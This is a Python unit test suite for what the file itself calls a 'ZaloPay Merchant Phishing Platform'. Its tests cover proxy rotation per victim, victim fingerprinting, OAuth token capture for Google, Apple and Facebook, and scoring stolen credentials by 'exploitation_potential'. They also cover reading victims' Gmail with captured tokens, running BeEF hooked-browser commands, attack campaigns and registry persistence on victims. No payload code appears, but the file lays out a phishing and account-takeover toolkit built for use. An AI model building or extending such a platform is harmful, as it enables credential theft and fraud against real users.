"""
Unit Tests for ZaloPay Merchant Phishing Platform
Comprehensive unit test suite for all core modules
"""

import os
import sys
import unittest
import pytest
import asyncio
import json
import time
from datetime import datetime, timezone, timedelta
from unittest.mock import Mock, patch, MagicMock
import tempfile
import shutil

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

# Import modules to test
from backend.api.capture.proxy_manager import ProxyManager
from backend.api.capture.fingerprint import FingerprintEngine
from backend.security.encryption_manager import EncryptionManager
from backend.services.google_oauth import GoogleOAuthService
from backend.services.apple_oauth import AppleOAuthService
from backend.services.facebook_oauth import FacebookOAuthService
from backend.engines.validation.validation_pipeline import ValidationPipeline
from backend.engines.gmail.gmail_client import GmailAPIClient
from backend.engines.beef.beef_client import BeEFAPIClient
from backend.websocket.manager import ConnectionManager
from backend.engines.ml.pattern_analyzer import PatternAnalyzer
from backend.engines.advanced.multi_vector_attacker import MultiVectorAttacker
from backend.engines.advanced.persistence_manager import PersistenceManager

class TestProxyManager(unittest.TestCase):
    """Test cases for ProxyManager"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.proxy_manager = ProxyManager()
        self.test_proxy = {
            "proxy_id": "test_proxy_1",
            "host": "127.0.0.1",
            "port": 8080,
            "protocol": "socks5",
            "country": "VN",
            "region": "Ho Chi Minh",
            "is_residential": True,
            "is_mobile": False,
            "health_score": 0.9,
            "last_checked": datetime.now(timezone.utc)
        }
    
    def test_proxy_assignment(self):
        """Test proxy assignment for victim"""
        victim_id = "test_victim_1"
        assigned_proxy = self.proxy_manager.assign_proxy_for_victim(victim_id)
        
        self.assertIsNotNone(assigned_proxy)
        self.assertIn("proxy_id", assigned_proxy)
        self.assertIn("host", assigned_proxy)
        self.assertIn("port", assigned_proxy)
    
    def test_proxy_health_check(self):
        """Test proxy health checking"""
        health_status = self.proxy_manager.check_proxy_health(self.test_proxy)
        
        self.assertIn("is_healthy", health_status)
        self.assertIn("response_time", health_status)
        self.assertIn("last_checked", health_status)
    
    def test_proxy_rotation(self):
        """Test proxy rotation mechanism"""
        victim_id = "test_victim_1"
        
        # Assign initial proxy
        proxy1 = self.proxy_manager.assign_proxy_for_victim(victim_id)
        
        # Rotate proxy
        proxy2 = self.proxy_manager.rotate_victim_proxy(victim_id)
        
        self.assertNotEqual(proxy1["proxy_id"], proxy2["proxy_id"])
    
    def test_proxy_release(self):
        """Test proxy release mechanism"""
        victim_id = "test_victim_1"
        
        # Assign proxy
        assigned_proxy = self.proxy_manager.assign_proxy_for_victim(victim_id)
        
        # Release proxy
        result = self.proxy_manager.release_victim_proxy(victim_id)
        
        self.assertTrue(result)
    
    def test_proxy_statistics(self):
        """Test proxy statistics generation"""
        stats = self.proxy_manager.get_proxy_statistics()
        
        self.assertIn("total_proxies", stats)
        self.assertIn("healthy_proxies", stats)
        self.assertIn("assigned_proxies", stats)
        self.assertIn("available_proxies", stats)

class TestFingerprintEngine(unittest.TestCase):
    """Test cases for FingerprintEngine"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.fingerprint_engine = FingerprintEngine()
        self.test_fingerprint_data = {
            "canvas_fingerprint": "test_canvas_hash",
            "webgl_fingerprint": "test_webgl_hash",
            "audio_fingerprint": "test_audio_hash",
            "font_list": ["Arial", "Times New Roman", "Courier New"],
            "screen_resolution": "1920x1080",
            "timezone": "Asia/Ho_Chi_Minh",
            "language": "vi-VN",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "plugins": ["Chrome PDF Plugin", "Native Client"],
            "browser_info": {
                "name": "Chrome",
                "version": "91.0.4472.124",
                "engine": "Blink"
            },
            "device_info": {
                "type": "desktop",
                "os": "Windows",
                "os_version": "10"
            }
        }
    
    def test_fingerprint_processing(self):
        """Test fingerprint data processing"""
        result = self.fingerprint_engine.process_fingerprint_data(self.test_fingerprint_data)
        
        self.assertIn("fingerprint_id", result)
        self.assertIn("processed_at", result)
        self.assertIn("fingerprint_hash", result)
        self.assertIn("device_profile", result)
    
    def test_device_detection(self):
        """Test device type detection"""
        device_type = self.fingerprint_engine.detect_device_type(self.test_fingerprint_data)
        
        self.assertIn(device_type, ["desktop", "mobile", "tablet"])
    
    def test_vietnamese_profile_matching(self):
        """Test Vietnamese device profile matching"""
        is_vietnamese = self.fingerprint_engine.is_vietnamese_profile(self.test_fingerprint_data)
        
        self.assertIsInstance(is_vietnamese, bool)
    
    def test_risk_assessment(self):
        """Test risk assessment based on fingerprint"""
        risk_score = self.fingerprint_engine.assess_risk_level(self.test_fingerprint_data)
        
        self.assertGreaterEqual(risk_score, 0)
        self.assertLessEqual(risk_score, 10)
    
    def test_fingerprint_uniqueness(self):
        """Test fingerprint uniqueness calculation"""
        uniqueness_score = self.fingerprint_engine.calculate_uniqueness_score(self.test_fingerprint_data)
        
        self.assertGreaterEqual(uniqueness_score, 0)
        self.assertLessEqual(uniqueness_score, 1)

class TestEncryptionManager(unittest.TestCase):
    """Test cases for EncryptionManager"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.encryption_manager = EncryptionManager()
        self.test_data = "This is sensitive test data"
        self.test_password = "test_password_123"
    
    def test_aes_encryption(self):
        """Test AES-256-GCM encryption"""
        encrypted_data = self.encryption_manager.encrypt_data(self.test_data)
        
        self.assertIsNotNone(encrypted_data)
        self.assertIn("ciphertext", encrypted_data)
        self.assertIn("nonce", encrypted_data)
        self.assertIn("tag", encrypted_data)
    
    def test_aes_decryption(self):
        """Test AES-256-GCM decryption"""
        encrypted_data = self.encryption_manager.encrypt_data(self.test_data)
        decrypted_data = self.encryption_manager.decrypt_data(encrypted_data)
        
        self.assertEqual(decrypted_data, self.test_data)
    
    def test_password_based_encryption(self):
        """Test password-based encryption"""
        encrypted_data = self.encryption_manager.encrypt_with_password(self.test_data, self.test_password)
        
        self.assertIsNotNone(encrypted_data)
        self.assertIn("ciphertext", encrypted_data)
        self.assertIn("salt", encrypted_data)
        self.assertIn("nonce", encrypted_data)
        self.assertIn("tag", encrypted_data)
    
    def test_password_based_decryption(self):
        """Test password-based decryption"""
        encrypted_data = self.encryption_manager.encrypt_with_password(self.test_data, self.test_password)
        decrypted_data = self.encryption_manager.decrypt_with_password(encrypted_data, self.test_password)
        
        self.assertEqual(decrypted_data, self.test_data)
    
    def test_key_generation(self):
        """Test encryption key generation"""
        key = self.encryption_manager.generate_key()
        
        self.assertIsNotNone(key)
        self.assertEqual(len(key), 32)  # 256 bits
    
    def test_key_derivation(self):
        """Test key derivation from password"""
        derived_key = self.encryption_manager.derive_key_from_password(self.test_password)
        
        self.assertIsNotNone(derived_key)
        self.assertEqual(len(derived_key), 32)
    
    def test_hmac_generation(self):
        """Test HMAC generation"""
        message = "test_message"
        hmac = self.encryption_manager.generate_hmac(message)
        
        self.assertIsNotNone(hmac)
        self.assertIn("hmac", hmac)
        self.assertIn("message", hmac)
    
    def test_hmac_verification(self):
        """Test HMAC verification"""
        message = "test_message"
        hmac_data = self.encryption_manager.generate_hmac(message)
        
        is_valid = self.encryption_manager.verify_hmac(hmac_data)
        self.assertTrue(is_valid)

class TestOAuthServices(unittest.TestCase):
    """Test cases for OAuth services"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.google_oauth = GoogleOAuthService()
        self.apple_oauth = AppleOAuthService()
        self.facebook_oauth = FacebookOAuthService()
    
    def test_google_oauth_authorization_url(self):
        """Test Google OAuth authorization URL generation"""
        auth_url = self.google_oauth.get_authorization_url("test_state")
        
        self.assertIsNotNone(auth_url)
        self.assertIn("https://accounts.google.com/oauth/authorize", auth_url)
        self.assertIn("client_id", auth_url)
        self.assertIn("redirect_uri", auth_url)
        self.assertIn("scope", auth_url)
        self.assertIn("state", auth_url)
    
    def test_apple_oauth_authorization_url(self):
        """Test Apple OAuth authorization URL generation"""
        auth_url = self.apple_oauth.get_authorization_url("test_state")
        
        self.assertIsNotNone(auth_url)
        self.assertIn("https://appleid.apple.com/auth/authorize", auth_url)
        self.assertIn("client_id", auth_url)
        self.assertIn("redirect_uri", auth_url)
        self.assertIn("state", auth_url)
    
    def test_facebook_oauth_authorization_url(self):
        """Test Facebook OAuth authorization URL generation"""
        auth_url = self.facebook_oauth.get_authorization_url("test_state")
        
        self.assertIsNotNone(auth_url)
        self.assertIn("https://www.facebook.com/v18.0/dialog/oauth", auth_url)
        self.assertIn("client_id", auth_url)
        self.assertIn("redirect_uri", auth_url)
        self.assertIn("state", auth_url)
    
    @patch('requests.post')
    def test_google_token_exchange(self, mock_post):
        """Test Google OAuth token exchange"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "access_token": "test_access_token",
            "refresh_token": "test_refresh_token",
            "expires_in": 3600,
            "token_type": "Bearer"
        }
        mock_response.status_code = 200
        mock_post.return_value = mock_response
        
        token_data = self.google_oauth.exchange_code_for_token("test_code")
        
        self.assertIsNotNone(token_data)
        self.assertIn("access_token", token_data)
        self.assertIn("refresh_token", token_data)
        self.assertIn("expires_in", token_data)
    
    @patch('requests.post')
    def test_apple_token_exchange(self, mock_post):
        """Test Apple OAuth token exchange"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "access_token": "test_access_token",
            "refresh_token": "test_refresh_token",
            "expires_in": 3600,
            "token_type": "Bearer",
            "id_token": "test_id_token"
        }
        mock_response.status_code = 200
        mock_post.return_value = mock_response
        
        token_data = self.apple_oauth.exchange_code_for_token("test_code")
        
        self.assertIsNotNone(token_data)
        self.assertIn("access_token", token_data)
        self.assertIn("id_token", token_data)
    
    @patch('requests.post')
    def test_facebook_token_exchange(self, mock_post):
        """Test Facebook OAuth token exchange"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "access_token": "test_access_token",
            "expires_in": 3600,
            "token_type": "Bearer"
        }
        mock_response.status_code = 200
        mock_post.return_value = mock_response
        
        token_data = self.facebook_oauth.exchange_code_for_token("test_code")
        
        self.assertIsNotNone(token_data)
        self.assertIn("access_token", token_data)
        self.assertIn("expires_in", token_data)

class TestValidationPipeline(unittest.TestCase):
    """Test cases for ValidationPipeline"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.validation_pipeline = ValidationPipeline()
        self.test_credential = {
            "email": "test@example.com",
            "password": "test_password",
            "oauth_token": "test_oauth_token",
            "provider": "google"
        }
    
    def test_credential_validation(self):
        """Test credential validation process"""
        result = self.validation_pipeline.validate_credential(self.test_credential)
        
        self.assertIn("is_valid", result)
        self.assertIn("validation_score", result)
        self.assertIn("validation_details", result)
        self.assertIn("business_intelligence", result)
        self.assertIn("market_classification", result)
    
    def test_oauth_token_validation(self):
        """Test OAuth token validation"""
        result = self.validation_pipeline.validate_oauth_token(self.test_credential["oauth_token"], "google")
        
        self.assertIn("is_valid", result)
        self.assertIn("token_info", result)
        self.assertIn("scope", result)
        self.assertIn("expires_at", result)
    
    def test_business_intelligence_extraction(self):
        """Test business intelligence extraction"""
        result = self.validation_pipeline.extract_business_intelligence(self.test_credential["email"])
        
        self.assertIn("company_info", result)
        self.assertIn("domain_analysis", result)
        self.assertIn("risk_assessment", result)
        self.assertIn("business_value", result)
    
    def test_market_classification(self):
        """Test market classification"""
        result = self.validation_pipeline.classify_market_segment(self.test_credential)
        
        self.assertIn("market_segment", result)
        self.assertIn("classification_score", result)
        self.assertIn("target_value", result)
        self.assertIn("exploitation_potential", result)

class TestGmailAPIClient(unittest.TestCase):
    """Test cases for GmailAPIClient"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.gmail_client = GmailAPIClient()
        self.test_token = "test_access_token"
    
    @patch('requests.get')
    def test_gmail_profile_retrieval(self, mock_get):
        """Test Gmail profile retrieval"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "emailAddress": "test@gmail.com",
            "messagesTotal": 1000,
            "threadsTotal": 500,
            "historyId": "12345"
        }
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        profile = self.gmail_client.get_profile(self.test_token)
        
        self.assertIsNotNone(profile)
        self.assertIn("emailAddress", profile)
        self.assertIn("messagesTotal", profile)
        self.assertIn("threadsTotal", profile)
    
    @patch('requests.get')
    def test_email_list_retrieval(self, mock_get):
        """Test email list retrieval"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "messages": [
                {"id": "msg1", "threadId": "thread1"},
                {"id": "msg2", "threadId": "thread2"}
            ],
            "nextPageToken": "next_token"
        }
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        emails = self.gmail_client.list_emails(self.test_token, max_results=10)
        
        self.assertIsNotNone(emails)
        self.assertIn("messages", emails)
        self.assertIn("nextPageToken", emails)
    
    @patch('requests.get')
    def test_email_content_retrieval(self, mock_get):
        """Test email content retrieval"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "id": "msg1",
            "threadId": "thread1",
            "payload": {
                "headers": [
                    {"name": "From", "value": "sender@example.com"},
                    {"name": "Subject", "value": "Test Subject"}
                ],
                "body": {
                    "data": "dGVzdCBib2R5"  # base64 encoded "test body"
                }
            }
        }
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        email = self.gmail_client.get_email(self.test_token, "msg1")
        
        self.assertIsNotNone(email)
        self.assertIn("id", email)
        self.assertIn("payload", email)

class TestBeEFAPIClient(unittest.TestCase):
    """Test cases for BeEFAPIClient"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.beef_client = BeEFAPIClient()
        self.test_session_id = "test_session_1"
    
    @patch('requests.get')
    def test_beef_session_list(self, mock_get):
        """Test BeEF session list retrieval"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "sessions": [
                {"id": "session1", "ip": "192.168.1.1", "browser": "Chrome"},
                {"id": "session2", "ip": "192.168.1.2", "browser": "Firefox"}
            ]
        }
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        sessions = self.beef_client.get_sessions()
        
        self.assertIsNotNone(sessions)
        self.assertIn("sessions", sessions)
    
    @patch('requests.get')
    def test_beef_session_details(self, mock_get):
        """Test BeEF session details retrieval"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "id": self.test_session_id,
            "ip": "192.168.1.1",
            "browser": "Chrome",
            "browser_version": "91.0.4472.124",
            "os": "Windows 10",
            "page_uri": "https://example.com",
            "hook_session": "abc123"
        }
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        session = self.beef_client.get_session(self.test_session_id)
        
        self.assertIsNotNone(session)
        self.assertIn("id", session)
        self.assertIn("ip", session)
        self.assertIn("browser", session)
    
    @patch('requests.post')
    def test_beef_command_execution(self, mock_post):
        """Test BeEF command execution"""
        mock_response = Mock()
        mock_response.json.return_value = {
            "command_id": "cmd1",
            "status": "success",
            "result": "Command executed successfully"
        }
        mock_response.status_code = 200
        mock_post.return_value = mock_response
        
        result = self.beef_client.execute_command(self.test_session_id, "test_command", {"param": "value"})
        
        self.assertIsNotNone(result)
        self.assertIn("command_id", result)
        self.assertIn("status", result)

class TestWebSocketManager(unittest.TestCase):
    """Test cases for WebSocketManager"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.connection_manager = ConnectionManager()
        self.test_user_id = "test_user_1"
        self.test_channel = "test_channel"
    
    def test_connection_registration(self):
        """Test WebSocket connection registration"""
        mock_websocket = Mock()
        
        self.connection_manager.register_connection(self.test_user_id, mock_websocket)
        
        self.assertIn(self.test_user_id, self.connection_manager.connections)
    
    def test_channel_subscription(self):
        """Test channel subscription"""
        mock_websocket = Mock()
        self.connection_manager.register_connection(self.test_user_id, mock_websocket)
        
        self.connection_manager.subscribe_to_channel(self.test_user_id, self.test_channel)
        
        self.assertIn(self.test_user_id, self.connection_manager.channel_subscriptions.get(self.test_channel, set()))
    
    def test_message_broadcasting(self):
        """Test message broadcasting"""
        mock_websocket = Mock()
        self.connection_manager.register_connection(self.test_user_id, mock_websocket)
        self.connection_manager.subscribe_to_channel(self.test_user_id, self.test_channel)
        
        message = {"type": "test_message", "data": "test_data"}
        self.connection_manager.broadcast_to_channel(self.test_channel, message)
        
        mock_websocket.send.assert_called_once()

class TestPatternAnalyzer(unittest.TestCase):
    """Test cases for PatternAnalyzer"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.pattern_analyzer = PatternAnalyzer()
        self.test_data = [
            {"feature1": 1, "feature2": 2, "target": "class1"},
            {"feature1": 3, "feature2": 4, "target": "class2"},
            {"feature1": 5, "feature2": 6, "target": "class1"}
        ]
    
    def test_pattern_analysis(self):
        """Test pattern analysis"""
        result = self.pattern_analyzer.analyze_patterns(self.test_data, "victim_behavior")
        
        self.assertIsNotNone(result)
        self.assertIn("total_samples", result)
        self.assertIn("num_clusters", result)
        self.assertIn("cluster_statistics", result)
    
    def test_anomaly_detection(self):
        """Test anomaly detection"""
        anomalies = self.pattern_analyzer.detect_anomalies(self.test_data, "behavioral")
        
        self.assertIsInstance(anomalies, list)
        for anomaly in anomalies:
            self.assertIn("anomaly_id", anomaly)
            self.assertIn("anomaly_type", anomaly)
            self.assertIn("severity", anomaly)
            self.assertIn("score", anomaly)
    
    def test_model_training(self):
        """Test model training"""
        model = self.pattern_analyzer.train_model("victim_behavior", self.test_data, "target")
        
        self.assertIsNotNone(model)
        self.assertIn("model_id", model)
        self.assertIn("accuracy", model)
        self.assertIn("precision", model)
        self.assertIn("recall", model)
        self.assertIn("f1_score", model)
    
    def test_prediction(self):
        """Test prediction"""
        # Train model first
        model = self.pattern_analyzer.train_model("victim_behavior", self.test_data, "target")
        
        # Make prediction
        prediction = self.pattern_analyzer.predict("victim_behavior", {"feature1": 2, "feature2": 3})
        
        self.assertIsNotNone(prediction)
        self.assertIn("prediction_id", prediction)
        self.assertIn("prediction", prediction)
        self.assertIn("confidence", prediction)

class TestMultiVectorAttacker(unittest.TestCase):
    """Test cases for MultiVectorAttacker"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.attacker = MultiVectorAttacker()
        self.test_victim_id = "test_victim_1"
        self.test_campaign_name = "test_campaign"
    
    def test_attack_campaign_creation(self):
        """Test attack campaign creation"""
        vector_types = ["phishing", "social_engineering"]
        attack_sequence = ["reconnaissance", "initial_access", "establishment"]
        
        campaign_id = self.attacker.create_attack_campaign(
            self.test_victim_id, 
            self.test_campaign_name, 
            vector_types, 
            attack_sequence
        )
        
        self.assertIsNotNone(campaign_id)
        self.assertIsInstance(campaign_id, str)
    
    def test_attack_execution(self):
        """Test attack execution"""
        # Create campaign first
        vector_types = ["phishing"]
        attack_sequence = ["reconnaissance", "initial_access"]
        
        campaign_id = self.attacker.create_attack_campaign(
            self.test_victim_id, 
            self.test_campaign_name, 
            vector_types, 
            attack_sequence
        )
        
        # Execute campaign
        execution_id = self.attacker.execute_attack_campaign(campaign_id)
        
        self.assertIsNotNone(execution_id)
        self.assertIsInstance(execution_id, str)
    
    def test_attack_status_retrieval(self):
        """Test attack status retrieval"""
        # Create and execute campaign
        vector_types = ["phishing"]
        attack_sequence = ["reconnaissance"]
        
        campaign_id = self.attacker.create_attack_campaign(
            self.test_victim_id, 
            self.test_campaign_name, 
            vector_types, 
            attack_sequence
        )
        
        execution_id = self.attacker.execute_attack_campaign(campaign_id)
        
        # Get status
        status = self.attacker.get_attack_status(execution_id)
        
        self.assertIsNotNone(status)
        self.assertIn("execution_id", status)
        self.assertIn("status", status)

class TestPersistenceManager(unittest.TestCase):
    """Test cases for PersistenceManager"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.persistence_manager = PersistenceManager()
        self.test_victim_id = "test_victim_1"
    
    def test_persistence_installation(self):
        """Test persistence mechanism installation"""
        mechanism_id = self.persistence_manager.install_persistence(
            self.test_victim_id, 
            "registry"
        )
        
        self.assertIsNotNone(mechanism_id)
        self.assertIsInstance(mechanism_id, str)
    
    def test_persistence_survival_check(self):
        """Test persistence survival check"""
        # Install persistence first
        mechanism_id = self.persistence_manager.install_persistence(
            self.test_victim_id, 
            "registry"
        )
        
        # Check survival
        check_result = self.persistence_manager.check_persistence_survival(mechanism_id)
        
        self.assertIsNotNone(check_result)
        self.assertIn("check_id", check_result)
        self.assertIn("status", check_result)
        self.assertIn("details", check_result)
    
    def test_persistence_removal(self):
        """Test persistence mechanism removal"""
        # Install persistence first
        mechanism_id = self.persistence_manager.install_persistence(
            self.test_victim_id, 
            "registry"
        )
        
        # Remove persistence
        result = self.persistence_manager.remove_persistence(mechanism_id)
        
        self.assertTrue(result)
    
    def test_persistence_status_retrieval(self):
        """Test persistence status retrieval"""
        # Install persistence first
        mechanism_id = self.persistence_manager.install_persistence(
            self.test_victim_id, 
            "registry"
        )
        
        # Get status
        status = self.persistence_manager.get_persistence_status(self.test_victim_id)
        
        self.assertIsNotNone(status)
        self.assertIn("victim_id", status)
        self.assertIn("mechanism_id", status)
        self.assertIn("persistence_type", status)
        self.assertIn("status", status)

class TestIntegrationScenarios(unittest.TestCase):
    """Integration test scenarios"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.proxy_manager = ProxyManager()
        self.fingerprint_engine = FingerprintEngine()
        self.encryption_manager = EncryptionManager()
    
    def test_victim_capture_workflow(self):
        """Test complete victim capture workflow"""
        victim_id = "integration_test_victim"
        
        # Step 1: Assign proxy
        proxy = self.proxy_manager.assign_proxy_for_victim(victim_id)
        self.assertIsNotNone(proxy)
        
        # Step 2: Process fingerprint
        fingerprint_data = {
            "canvas_fingerprint": "test_canvas",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "screen_resolution": "1920x1080",
            "timezone": "Asia/Ho_Chi_Minh"
        }
        
        fingerprint_result = self.fingerprint_engine.process_fingerprint_data(fingerprint_data)
        self.assertIsNotNone(fingerprint_result)
        
        # Step 3: Encrypt sensitive data
        sensitive_data = json.dumps({
            "victim_id": victim_id,
            "fingerprint": fingerprint_result,
            "proxy": proxy
        })
        
        encrypted_data = self.encryption_manager.encrypt_data(sensitive_data)
        self.assertIsNotNone(encrypted_data)
        
        # Step 4: Verify decryption
        decrypted_data = self.encryption_manager.decrypt_data(encrypted_data)
        self.assertEqual(decrypted_data, sensitive_data)
    
    def test_oauth_flow_integration(self):
        """Test OAuth flow integration"""
        google_oauth = GoogleOAuthService()
        apple_oauth = AppleOAuthService()
        facebook_oauth = FacebookOAuthService()
        
        # Test authorization URL generation for all providers
        google_url = google_oauth.get_authorization_url("test_state")
        apple_url = apple_oauth.get_authorization_url("test_state")
        facebook_url = facebook_oauth.get_authorization_url("test_state")
        
        self.assertIsNotNone(google_url)
        self.assertIsNotNone(apple_url)
        self.assertIsNotNone(facebook_url)
        
        # Verify URLs contain required parameters
        self.assertIn("client_id", google_url)
        self.assertIn("client_id", apple_url)
        self.assertIn("client_id", facebook_url)

if __name__ == '__main__':
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add test cases
    test_classes = [
        TestProxyManager,
        TestFingerprintEngine,
        TestEncryptionManager,
        TestOAuthServices,
        TestValidationPipeline,
        TestGmailAPIClient,
        TestBeEFAPIClient,
        TestWebSocketManager,
        TestPatternAnalyzer,
        TestMultiVectorAttacker,
        TestPersistenceManager,
        TestIntegrationScenarios
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Print summary
    print(f"\n{'='*50}")
    print(f"Test Summary:")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    print(f"{'='*50}")
    
    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)
